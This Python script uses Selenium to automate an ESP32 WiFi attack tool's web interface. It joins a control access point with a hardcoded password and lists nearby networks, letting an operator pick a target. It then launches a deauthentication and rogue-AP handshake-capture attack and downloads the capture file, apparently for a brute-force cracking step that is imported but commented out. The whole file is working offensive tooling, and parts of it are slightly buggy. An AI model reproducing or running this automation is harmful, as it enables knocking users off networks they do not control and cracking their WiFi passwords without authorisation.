from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from connect import get_wifi_name, connect_to_wifi
import time
from brute_force import run_aircrack
from ap_display import lcd_menu
import os

DOWNLOADED_PATH = None
driver = None
LOADING_WAIT_TIME = 5

def extract_substrings(str_list):
    result=[]
    for s in str_list:
        if '\n' in s:
            i = s.find('\n')
            result.append(s[i + 1:])
    return result

def choose_attack_method():
    return "DEAUTH_ROGUE_AP (PASSIVE)"

def choose_time():
    return "20"


def isvisible(element_id):
    try:
        element = driver.find_element(By.ID, element_id)
        if element.is_displayed():
            return 1
        else:
            return 0
    except:
        print(f"Element with ID '{element_id}' **not found**.")
        display("Rendering..")
        return 0


def display(content : str):
    print(content.upper())

display("Welcome.")

a = 0
while a == 0:
    try:
        i = 0
        while get_wifi_name() != "ManagementAP" and i < 10:
            connect_to_wifi("ManagementAP", "mgmtadmin")
            i+=1
        if get_wifi_name() != "ManagementAP":
            display("Can't connect.")
    except Exception as e:
        print("Test the connectivity to Raspberry")
    service = Service(r"C:\chromedriver\chromedriver.exe")
    driver = webdriver.Chrome(service=service)
    driver.get("http://192.168.4.1")  # Your ESP32 web server URL
    display("Loading")
    time.sleep(LOADING_WAIT_TIME)
    if(isvisible("ready")):
        print("Ready.")
        row = driver.find_elements(By.TAG_NAME, "table")[0]
        aplist = []
        for i in range(1, len(row.find_elements(By.TAG_NAME, "tr"))):
            ap_details = row.find_elements(By.TAG_NAME, "tr")[i]
            ap = ap_details.find_elements(By.TAG_NAME, "td")[0].text
            aplist.append(ap)
        print(aplist)
        index = lcd_menu(aplist)
        if len(aplist) == 0:
            print("No Wifi found.\n")
            exit()
        display("Attacking")
        row.find_elements(By.TAG_NAME, "tr")[1+index].click()
        Select(driver.find_element("id", "attack_type")).select_by_visible_text("ATTACK_TYPE_HANDSHAKE")
        method = choose_attack_method()
        Select(driver.find_element("id", "attack_method")).select_by_visible_text(method)
        attack_time = choose_time()
        driver.find_element("id", "attack_timeout").clear()
        driver.find_element("id", "attack_timeout").send_keys(attack_time)
        f = driver.find_elements(By.TAG_NAME, "fieldset")[1].find_elements(By.TAG_NAME, "p")[3].find_element(By.TAG_NAME, "button").click()
        time.sleep(3+int(attack_time))
        driver.quit()
        continue
    elif isvisible("running"):
        print("Running.")
    elif isvisible("result"):
        print("Result.")
        handshake_data = driver.find_element("id", "result").find_elements(By.TAG_NAME, "pre")
        if(len(handshake_data) == 0):
            error_occured = 1
            display("Try Again!")
        else:
            error_occured = 0
            driver2 = webdriver.Chrome(service=service)
            print("handshake file caught")
            driver2.get("http://192.168.4.1/capture.hccapx")
            time.sleep(3)
            driver.find_element("id", "result").find_element(By.TAG_NAME, "button").click()
            os.remove(DOWNLOADED_PATH)
            driver2.quit()
    else:
        display("Page not found")
        driver.quit()
    a = 1
# run_aircrack()
